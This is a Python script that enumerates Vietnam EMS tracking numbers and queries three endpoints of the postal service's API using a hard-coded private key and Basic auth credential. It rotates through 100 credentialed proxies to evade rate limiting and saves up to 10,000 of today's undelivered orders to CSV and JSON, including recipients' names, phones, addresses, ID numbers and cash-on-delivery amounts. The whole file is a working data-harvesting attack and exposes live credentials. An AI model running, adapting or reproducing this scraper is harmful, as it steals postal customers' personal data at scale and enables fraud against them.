#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高速扫描今天的订单 - 完整版（调用3个API获取所有字段）
策略：扫描最新区间，只保存今天发件的，同时调用3个API获取完整信息
"""
import hashlib, requests, json, time, random, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")  # 15/10/2025
proxies, print_lock = [], threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}
TARGET = 10000

# 100个代理池（完整）
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
    "104.239.40.211:6830:uadkcvtn:uo2rzar814ph",
    "67.227.37.26:5568:uadkcvtn:uo2rzar814ph",
    "108.165.218.84:5823:uadkcvtn:uo2rzar814ph",
    "109.196.160.242:5988:uadkcvtn:uo2rzar814ph",
    "104.238.38.204:6472:uadkcvtn:uo2rzar814ph",
    "140.99.203.108:5985:uadkcvtn:uo2rzar814ph",
    "82.25.224.37:7848:uadkcvtn:uo2rzar814ph",
    "216.74.118.50:6205:uadkcvtn:uo2rzar814ph",
    "104.239.13.199:6828:uadkcvtn:uo2rzar814ph",
    "161.123.152.216:6461:uadkcvtn:uo2rzar814ph",
    "185.72.240.218:7254:uadkcvtn:uo2rzar814ph",
    "104.239.43.88:5816:uadkcvtn:uo2rzar814ph",
    "92.113.115.48:5995:uadkcvtn:uo2rzar814ph",
    "145.223.44.64:5747:uadkcvtn:uo2rzar814ph",
    "155.254.34.216:6196:uadkcvtn:uo2rzar814ph",
    "166.88.169.112:6719:uadkcvtn:uo2rzar814ph",
    "82.23.223.60:7904:uadkcvtn:uo2rzar814ph",
    "166.88.235.140:5768:uadkcvtn:uo2rzar814ph",
    "23.129.252.17:6285:uadkcvtn:uo2rzar814ph",
    "46.203.134.90:5714:uadkcvtn:uo2rzar814ph",
    "82.23.227.49:7352:uadkcvtn:uo2rzar814ph",
    "104.239.13.114:6743:uadkcvtn:uo2rzar814ph",
    "50.114.98.129:5613:uadkcvtn:uo2rzar814ph",
    "154.6.83.144:6615:uadkcvtn:uo2rzar814ph",
    "45.38.86.229:6158:uadkcvtn:uo2rzar814ph",
    "64.137.73.19:5107:uadkcvtn:uo2rzar814ph",
    "45.131.101.19:6286:uadkcvtn:uo2rzar814ph",
    "104.239.40.197:6816:uadkcvtn:uo2rzar814ph",
    "82.21.209.226:6555:uadkcvtn:uo2rzar814ph",
    "23.26.71.157:5640:uadkcvtn:uo2rzar814ph",
    "23.27.91.75:6154:uadkcvtn:uo2rzar814ph",
    "23.95.150.72:6041:uadkcvtn:uo2rzar814ph",
    "82.26.218.128:6436:uadkcvtn:uo2rzar814ph",
    "91.223.126.118:6730:uadkcvtn:uo2rzar814ph",
    "145.223.44.177:5860:uadkcvtn:uo2rzar814ph",
    "45.38.94.42:5963:uadkcvtn:uo2rzar814ph",
    "23.26.95.215:5697:uadkcvtn:uo2rzar814ph",
    "50.114.15.8:5993:uadkcvtn:uo2rzar814ph",
    "82.24.217.113:5443:uadkcvtn:uo2rzar814ph",
    "136.0.109.46:6332:uadkcvtn:uo2rzar814ph",
    "185.101.253.194:5754:uadkcvtn:uo2rzar814ph",
    "38.153.133.31:9435:uadkcvtn:uo2rzar814ph",
    "108.165.161.42:5783:uadkcvtn:uo2rzar814ph",
    "2.57.31.80:6656:uadkcvtn:uo2rzar814ph",
    "45.56.173.242:6225:uadkcvtn:uo2rzar814ph",
    "216.173.104.22:6159:uadkcvtn:uo2rzar814ph",
    "216.173.123.97:6472:uadkcvtn:uo2rzar814ph",
    "104.253.55.119:5549:uadkcvtn:uo2rzar814ph",
    "91.211.87.2:6992:uadkcvtn:uo2rzar814ph",
    "142.111.44.203:5915:uadkcvtn:uo2rzar814ph",
    "191.101.174.88:6136:uadkcvtn:uo2rzar814ph",
    "31.58.26.144:6727:uadkcvtn:uo2rzar814ph",
    "104.232.211.81:5694:uadkcvtn:uo2rzar814ph",
    "104.253.48.76:5500:uadkcvtn:uo2rzar814ph",
    "154.36.85.89:6600:uadkcvtn:uo2rzar814ph",
    "140.99.202.10:5888:uadkcvtn:uo2rzar814ph",
    "45.41.169.227:6888:uadkcvtn:uo2rzar814ph",
    "45.67.0.158:6594:uadkcvtn:uo2rzar814ph",
    "45.150.176.51:5924:uadkcvtn:uo2rzar814ph",
    "104.238.7.43:5970:uadkcvtn:uo2rzar814ph",
    "216.173.75.47:6348:uadkcvtn:uo2rzar814ph",
    "45.39.5.58:6496:uadkcvtn:uo2rzar814ph",
    "46.203.157.176:7119:uadkcvtn:uo2rzar814ph",
    "104.233.20.17:6033:uadkcvtn:uo2rzar814ph",
    "216.74.114.235:6518:uadkcvtn:uo2rzar814ph",
    "142.202.254.167:6145:uadkcvtn:uo2rzar814ph",
    "37.44.219.236:6201:uadkcvtn:uo2rzar814ph",
    "82.24.239.176:7033:uadkcvtn:uo2rzar814ph",
    "104.239.19.194:6871:uadkcvtn:uo2rzar814ph",
    "191.101.181.187:6940:uadkcvtn:uo2rzar814ph",
    "38.154.199.233:5387:uadkcvtn:uo2rzar814ph",
    "45.39.18.128:6564:uadkcvtn:uo2rzar814ph",
    "103.47.53.151:8449:uadkcvtn:uo2rzar814ph",
    "45.39.17.119:5542:uadkcvtn:uo2rzar814ph",
    "216.173.75.226:6527:uadkcvtn:uo2rzar814ph",
    "45.56.175.4:5678:uadkcvtn:uo2rzar814ph",
    "64.137.89.84:6157:uadkcvtn:uo2rzar814ph",
    "82.21.248.115:6451:uadkcvtn:uo2rzar814ph",
    "198.46.241.44:6579:uadkcvtn:uo2rzar814ph",
    "45.83.57.20:6537:uadkcvtn:uo2rzar814ph",
    "104.239.41.168:6523:uadkcvtn:uo2rzar814ph",
    "64.137.77.92:5527:uadkcvtn:uo2rzar814ph",
    "104.253.82.58:6479:uadkcvtn:uo2rzar814ph",
    "82.23.223.166:8010:uadkcvtn:uo2rzar814ph",
    "185.15.178.90:5774:uadkcvtn:uo2rzar814ph",
    "209.127.191.113:5187:uadkcvtn:uo2rzar814ph",
    "191.101.174.78:6126:uadkcvtn:uo2rzar814ph",
    "217.69.127.152:6773:uadkcvtn:uo2rzar814ph",
    "38.225.2.55:5838:uadkcvtn:uo2rzar814ph",
    "92.112.136.179:6123:uadkcvtn:uo2rzar814ph",
]

def load_proxies():
    global proxies
    for p in PROXIES:  # 使用全部100个代理
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
    print(f"✅ 加载 {len(proxies)} 个代理\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    """检查日期是否是今天"""
    return date_str and TODAY in str(date_str)

def extract_phone(text):
    if not text:
        return None
    phones = re.findall(r'0\d{8,10}', str(text))
    return phones[0] if phones else None

def call_api_with_retry(url, headers, data=None, json_data=None, max_retries=10):
    """调用API并支持限流重试（自动切换代理）"""
    for attempt in range(max_retries):
        try:
            # 随机选择代理
            proxy = random.choice(proxies) if proxies else None
            
            # 发送请求
            if json_data:
                r = requests.post(url, headers=headers, json=json_data, proxies=proxy, timeout=8)
            else:
                r = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=8)
            
            # 检查响应
            if r.status_code == 200:
                try:
                    data = r.json()
                    code = data.get('Code', '')
                    
                    # 检测限流（Code: 98 或 429）
                    if code == '98' or code == '429':
                        # 限流，换代理重试
                        time.sleep(0.2 + random.uniform(0, 0.3))  # 随机延迟
                        continue
                    
                    # 正常返回（Code: 00 或 01 都算成功）
                    return r, data
                except:
                    # JSON解析失败，但HTTP成功
                    return r, None
            else:
                # HTTP错误，换代理重试
                if attempt < max_retries - 1:
                    time.sleep(0.1)
                    continue
                return r, None
                
        except requests.exceptions.Timeout:
            # 超时，换代理重试
            if attempt < max_retries - 1:
                continue
            return None, None
        except Exception as e:
            # 其他错误，换代理重试
            if attempt < max_retries - 1:
                time.sleep(0.1)
                continue
            return None, None
    
    # 所有重试都失败
    return None, None

def check_order_full(tracking):
    """完整版查询：同时调用3个API获取所有字段（支持限流重试）"""
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    
    # 准备请求头
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    headers_json = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/json"
    }
    
    # 初始化订单数据（包含所有字段）
    order = {
        'tracking': tracking,
        # API 1: Inquiry 字段（38个）
        'ParcelCode': '',
        'Count': '',
        'IsCOD': '',
        'SenderName': '',
        'SenderAddress': '',
        'SenderPhone': '',
        'ReceiverName': '',
        'ReceiverAddress': '',
        'ReceiverPhone': '',
        'ReceiverIDNumber': '',
        'CollectAmount': 0,
        'IsPaypost': '',
        'ReceiveCollectFee': '',
        'IssuePOCode': '',
        'IssueDate': '',
        'LoadDate': '',
        'DeliveryPOCode': '',
        'DeliveryDate': '',
        'Weigh': '',
        'Status': '',
        'StatusName': '',
        'ReasonName': '',
        'SolutionName': '',
        'CheckStatus': '',
        'CheckStatusNo': '',
        'Note': '',
        'RouteCode': '',
        'IsPaypostName': '',
        'DeliverySignature': '',
        'DeliveryImage': '',
        'DeliveryImageAuthen': '',
        'AmountCOD': 0,
        'FeePPA': 0,
        'FeeC': 0,
        'FeeShip': 0,
        'FeeCancelOrder': 0,
        'FeeCollectLater': 0,
        'Instruction': '',
        'VATCode': '',
        # API 2: Journey 字段
        'journey_records': [],
        'journey_count': 0,
        'is_delivered': False,
        # API 3: Gateway 字段
        'products': [],
        'product_count': 0,
        'product_name': '',
    }
    
    try:
        with state['lock']:
            state['tested'] += 1
        
        # ==================== API 1: Inquiry（支持限流重试）====================
        r1, data1 = call_api_with_retry(
            f"{API_URL}api/Delivery/Inquiry",
            headers_form,
            data={"ParcelCode": tracking, "Signature": sig},
            max_retries=10
        )
        
        if r1 and data1 and data1.get('Code') == '00' and data1.get('Value'):
            v = data1['Value']
            
            # 保存所有Inquiry字段
            for key in v.keys():
                if key in order:
                    order[key] = v[key] if v[key] is not None else ''
            
            # 检查日期：只要今天的或日期为空的，排除今天之外的
            issue_date = v.get('IssueDate') or v.get('LoadDate')
            # 如果日期存在且不是今天，则跳过
            if issue_date and not is_today(issue_date):
                return None  # 不是今天的，跳过
            # 如果日期为空或是今天，则继续处理
        else:
            return None  # 查询失败，跳过
        
        # ==================== API 2: DeliveryLadingJourney（支持限流重试）====================
        r2, data2 = call_api_with_retry(
            f"{API_URL}api/Delivery/DeliveryLadingJourney",
            headers_form,
            data={"ParcelCode": tracking},
            max_retries=10
        )
        
        if r2 and data2:
            if data2.get('Code') == '00' and data2.get('ListValue'):
                journey_list = data2['ListValue']
                order['journey_records'] = journey_list
                order['journey_count'] = len(journey_list)
                order['is_delivered'] = True
            else:
                order['is_delivered'] = False
        
        # ==================== API 3: Gateway/Bussiness（支持限流重试）====================
        r3, data3 = call_api_with_retry(
            f"{API_URL}api/Gateway/Bussiness",
            headers_json,
            json_data={"Code": "LDP002", "Data": tracking},
            max_retries=10
        )
        
        if r3 and data3 and data3.get('Code') == '00' and data3.get('Data'):
            try:
                products = json.loads(data3['Data'])
                order['products'] = products
                order['product_count'] = len(products)
                if products:
                    order['product_name'] = products[0].get('ProductName', '')
            except:
                pass
        
        # 只保存未配送的订单
        if not order['is_delivered']:
            with state['lock']:
                state['found'] += 1
                state['orders'].append(order)
                
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                
                safe_print(f"✅ [{state['found']}/{TARGET}] {tracking} | "
                          f"👤{order['ReceiverName'][:20]} | "
                          f"📞{order['ReceiverPhone']} | "
                          f"💰{order['CollectAmount']:,}₫ | "
                          f"📦{order['product_name'][:15] if order['product_name'] else 'N/A'} | "
                          f"⚡{speed:.0f}/s")
                
                # 每100个保存一次
                if state['found'] % 100 == 0:
                    save_progress()
            
            return True
    except:
        pass
    
    return False

def save_progress():
    """保存进度 - CSV + JSON"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # ==================== CSV 文件（所有字段） ====================
    csv_file = f"today_undelivered_full_{timestamp}.csv"
    with open(csv_file, 'w', encoding='utf-8-sig') as f:
        # CSV表头（所有字段）
        headers = [
            '运单号', '发件日期', '装载日期', '配送日期',
            '发件人', '发件电话', '发件地址',
            '收件人', '收件电话', '收件地址', '收件人身份证',
            'COD代收金额', 'COD金额', '运费', 'PPA费用', 'C费用', '取消费', '稍后收款费',
            '重量', '状态代码', '状态名称',
            '发件邮局', '配送邮局', '路线代码',
            '是否COD', '是否邮资', '邮资名称',
            '配送签名URL', '配送照片URL', '配送认证照片URL',
            '备注', '指令', 'VAT代码', '原因', '解决方案',
            '检查状态', '检查状态号', '计数',
            '是否已配送', '配送记录数',
            '商品数量', '商品名称',
            '收取费用'
        ]
        f.write(','.join(headers) + '\n')
        
        # 数据行
        for o in state['orders']:
            row = [
                o['tracking'],
                o['IssueDate'],
                o['LoadDate'],
                o['DeliveryDate'],
                o['SenderName'],
                o['SenderPhone'],
                o['SenderAddress'],
                o['ReceiverName'],
                o['ReceiverPhone'],
                o['ReceiverAddress'],
                o['ReceiverIDNumber'],
                str(o['CollectAmount']),
                str(o['AmountCOD']),
                str(o['FeeShip']),
                str(o['FeePPA']),
                str(o['FeeC']),
                str(o['FeeCancelOrder']),
                str(o['FeeCollectLater']),
                o['Weigh'],
                o['Status'],
                o['StatusName'],
                o['IssuePOCode'],
                o['DeliveryPOCode'],
                o['RouteCode'],
                o['IsCOD'],
                o['IsPaypost'],
                o['IsPaypostName'],
                o['DeliverySignature'],
                o['DeliveryImage'],
                o['DeliveryImageAuthen'],
                o['Note'],
                o['Instruction'],
                o['VATCode'],
                o['ReasonName'],
                o['SolutionName'],
                str(o['CheckStatus']),
                str(o['CheckStatusNo']),
                str(o['Count']),
                '是' if o['is_delivered'] else '否',
                str(o['journey_count']),
                str(o['product_count']),
                o['product_name'],
                o['ReceiveCollectFee'],
            ]
            # 转义引号并添加双引号
            row = [f'"{str(item).replace(chr(34), chr(34)+chr(34))}"' for item in row]
            f.write(','.join(row) + '\n')
    
    # ==================== JSON 文件（完整数据包括嵌套对象） ====================
    json_file = f"today_undelivered_full_{timestamp}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'scan_date': TODAY,
            'total_found': state['found'],
            'total_tested': state['tested'],
            'success_rate': state['found']/state['tested']*100 if state['tested'] > 0 else 0,
            'orders': state['orders']
        }, f, ensure_ascii=False, indent=2)
    
    safe_print(f"\n💾 已保存 {state['found']} 个订单:")
    safe_print(f"   📄 CSV: {csv_file}")
    safe_print(f"   📄 JSON: {json_file}\n")

# 扫描最新区间（最可能有今天的）
SCAN_RANGES = [
    ('EP', 493500000, 494500000, 10),   # EP最新，步长10
    ('EB', 943000000, 945000000, 20),   # EB最新
    ('EC', 149780000, 149790000, 5),    # EC最新
    ('EF', 48000000, 49000000, 50),     # EF最新
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║     🚀 扫描今天未签收订单（完整版-3个API全字段） - {TODAY}      ║
╚════════════════════════════════════════════════════════════════════════════╝

📋 功能说明：
  • 同时调用 3 个 API 获取完整信息
  • API 1 (Inquiry): 38个基础字段
  • API 2 (Journey): 配送轨迹
  • API 3 (Gateway): 商品信息
  • 只保存今天发件 + 未签收的订单（日期为空也保留）

⚡ 性能优化：
  • 50 线程高速并发（提升速度）
  • 100 个代理池轮询
  • 遇到限流自动切换代理重试（最多10次）
  • 自动处理 Code 98/429 限流

📊 输出格式：
  • CSV: 包含所有42个字段（适合Excel分析）
  • JSON: 包含完整嵌套数据（配送记录、商品列表）

🎯 目标: {TARGET:,}个订单

扫描区间：
  EP: 493500000-494500000 (步长10)
  EB: 943000000-945000000 (步长20)
  EC: 149780000-149790000 (步长5)
  EF: 48000000-49000000 (步长50)
""")

load_proxies()

print(f"🚀 开始高速扫描（完整版 - 支持限流自动重试）...\n")
start_time = time.time()

with ThreadPoolExecutor(max_workers=50) as executor:  # 提升并发数到50
    futures = []
    
    for prefix, start, end, step in SCAN_RANGES:
        if state['found'] >= TARGET:
            break
        
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_order_full, tracking))
    
    # 等待完成
    for future in as_completed(futures):
        try:
            future.result()
            
            # 显示进度
            if state['tested'] % 1000 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                safe_print(f"\n📊 已扫{state['tested']} | 找到{state['found']} | {speed:.0f}/s | {state['found']/state['tested']*100:.2f}%\n")
        except:
            pass

# 最终保存
save_progress()

elapsed = time.time() - start_time
print(f"""
\n{'='*80}
🎉 扫描完成（完整版）！
{'='*80}
找到今天未签收订单: {state['found']:,} 个
已测试: {state['tested']:,} 个
成功率: {state['found']/state['tested']*100:.2f}%
耗时: {elapsed:.1f} 秒 ({elapsed/60:.1f} 分钟)
速度: {state['tested']/elapsed:.0f} 次/秒

📊 数据字段统计:
  • API 1 (Inquiry): 38 个基础字段
  • API 2 (Journey): 配送轨迹列表
  • API 3 (Gateway): 商品信息列表
  • 总计: 42+ 个字段

💾 输出文件:
  • CSV 文件: 包含所有扁平化字段（适合Excel）
  • JSON 文件: 包含完整嵌套数据（适合程序分析）
{'='*80}
""")
